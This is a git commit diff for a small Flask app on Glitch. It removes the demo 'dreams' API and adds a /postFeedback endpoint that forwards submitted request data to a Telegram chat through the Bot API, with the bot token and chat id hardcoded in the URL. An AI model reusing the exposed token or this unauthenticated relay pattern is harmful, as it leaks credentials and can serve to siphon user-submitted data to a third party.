17974ff5a2ac61aec57aaef6115cfe38aaa4dbd8
Glitch (hello-flask) <none>
2024-03-27 14:53:28 +0000

    🕵🚗 Checkpoint ./server.py:5501376/2061 ./views/index.html:5501376/812 ./requirements.txt:5501376/17

--- server.py
+++ server.py
@@ -1,58 +1,21 @@
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
-#       _                              
-#      | |                             
-#    __| |_ __ ___  __ _ _ __ ___  ___ 
-#   / _` | '__/ _ \/ _` | '_ ` _ \/ __|
-#  | (_| | | |  __/ (_| | | | | | \__ \
-#   \__,_|_|  \___|\__,_|_| |_| |_|___/ .
-#
-# A 'Fog Creek'–inspired demo by Kenneth Reitz™
-
 import os
 from flask import Flask, request, render_template, jsonify
+from requests import get, post
 
-# Support for gomix's 'front-end' and 'back-end' UI.
 app = Flask(__name__, static_folder='public', template_folder='views')
 
-# Set the app secret key from the secret environment variables.
 app.secret = os.environ.get('SECRET')
-
-# Dream database. Store dreams in memory for now. 
-DREAMS = ['Python. Python, everywhere.']
-
-
-@app.after_request
-def apply_kr_hello(response):
-    """Adds some headers to all responses."""
-  
-    # Made by Kenneth Reitz. 
-    if 'MADE_BY' in os.environ:
-        response.headers["X-Was-Here"] = os.environ.get('MADE_BY')
-    
-    # Powered by Flask. 
-    response.headers["X-Powered-By"] = os.environ.get('POWERED_BY')
-    return response
-
 
 @app.route('/')
 def homepage():
     """Displays the homepage."""
     return render_template('index.html')
-    
-@app.route('/dreams', methods=['GET', 'POST'])
-def dreams():
-    """Simple API endpoint for dreams. 
-    In memory, ephemeral, like real dreams.
-    """
   
-    # Add a dream to the in-memory database, if given. 
-    if 'dream' in request.args:
-        DREAMS.append(request.args['dream'])
+@app.route('/postFeedback', methods=['POST'])
+def postFeedback():
+    req = get('https://api.telegram.org/bot7114465780:AAECltozhDbmqfebfryry2A4z0dL5xOF5y8/sendMessage?chat_id=468110974&parse_mode=Markdown&text=a',data=request.data)
+    return req.content, req.status_code
     
-    # Return the list of remembered dreams. 
-    return jsonify(DREAMS)
 
 if __name__ == '__main__':
     app.run()
